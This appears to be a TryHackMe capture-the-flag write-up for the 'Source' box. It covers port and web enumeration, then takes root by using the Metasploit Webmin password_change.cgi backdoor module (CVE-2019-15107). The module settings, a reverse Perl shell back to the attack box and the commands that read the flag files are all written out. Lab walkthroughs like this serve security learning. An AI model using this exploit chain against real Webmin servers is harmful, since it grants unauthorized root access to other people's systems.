# THM Source Writeup
## System Information
Kali VM as attack box internal IP 192.168.135.195
Target IP 10.112.168.31
## Goals
User.txt, root.txt

No hints

Description: Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?

### Enumeration
I always start with three methods: Nmap (full scan with services), Gobuster with a small list and webbrowser enumeration

#### Nmap
Finding: Revealed two open ports: 22/tcp (OpenSSH) and 10000/tcp http Miniserv 1.890 Webmin httpd.
Port 10000 open with Webmin is unusual and should be further investigated.

source nmap -sC -sV -p- 10.112.168.31             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-03 11:44 -0400
Nmap scan report for 10.112.168.31
Host is up (0.012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.53 seconds

#### Gobuster
Finding: Connection refused. Checked if VPN was active (it was) to rule out technical issues on my attack box.

gobuster dir -u http://10.112.168.31 -w /usr/share/wordlists/dirb/common.txt
(snip)
Progress: 0 / 1 (0.00%)
2026/05/03 11:45:11 error on running gobuster on http://10.112.168.31/: connection refused

Idea: Either on purpose or there is another way to scan it. I tried some other methods (-k; wildcards) and got the same response. As there is no open port 80, there is no webserver here to scan. Scanning with port :10000 specifically yielded different results, so we dropped gobuster for now.

#### Web enumeration
Could not connect via browser just by the IP.

Tried the port :10000 and Firefox raised a warning because the site's certificate is self-signed. This is unusual, so i looked at the certificate. 
Certificate revealed an E-Mail: root@source. Certificate was issued for "*", which also is unusual. So we got a self signed certificate for a webapp with placeholder * and a possible user name (root@source).

Visited the site via Firefox ("i know the risk") and got to a login page.
Looking at the source, I could not find any comments or anything out of the ordinary (from first glance).

#### Login webapp

Tried to login with gibberish credentials to find out, if a) login actually works and b) what happens when we use the possible working username root@source.
I tried to login with root@source and passwords admin/password/root. As a result my access was denied: 
"Error - Access denied for 192.168.135.195. The host has been blocked because of too many authentication failures."
I waited some seconds and tried again, was not blocked anymore. So bruteforcing might be harder, bur possible. Though not the 'intended path'.

#### Research
We got a username and a servicename. We got no gubuster results and we got a webapp login which locks our IP for some seconds after 3-4 login attempts. 

Searched for the service and known CVE. Found some (https://de.tenable.com/blog/cve-2019-15107-exploit-modules-available-for-remote-code-execution-vulnerability-in-webmin).
Also checked with "searchsploit webmin" and got some results which fit the description (password change backdoor). 

### Attacking with metasploit to root access
started Metasploit with msfconsole
search webmin 
"Nr. 10 exploit/linux/http/webmin_backdoor 2019-08-10 excellent Yes Webmin password_change.cgi Backdoor" fit the description of the researched backdoor best.

use 10
options to see required options. Showed RPORT as 10000, which matched the port we already saw.

set RHOSTS 10.112.168.31

set RPORT 10000

set SSL true

set TARGETURI /

set LHOST 192.168.135.195

check

[+] 10.112.168.31:10000 - The target is vulnerable.

run

msf exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 192.168.135.195:4444 

[*] Running automatic check ("set AutoCheck false" to disable)

[+] The target is vulnerable.

[*] Configuring Automatic (Unix In-Memory) target

[*] Sending cmd/unix/reverse_perl command payload

[*] Command shell session 1 opened (192.168.135.195:4444 -> 10.112.168.31:52116) at 2026-05-03 12:30:51 -0400

#### Confirming root and getting the flags

id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt

(REDACTED)

we don't know the user name, but it's always in the home/user directory, so we can use a wildcard:

cat /home/*/user.txt

(REDACTED)

Completed the tasks at hand. Nothing to see here.

### Summary
- Nmap revealed service webmin and version
- Gobuster did not give any results
- webapp / login locks out attackers who bruteforce
- pivot: researching vulnerabilites for known services
- using metasploit to get root access based on research
- got directly rooted, no need for privesc

### Patterns / Learnings
Known admin service on unusual port (Webmin on 10000). Prioritize public RCE exploits over brute force or further enumeration if possible.
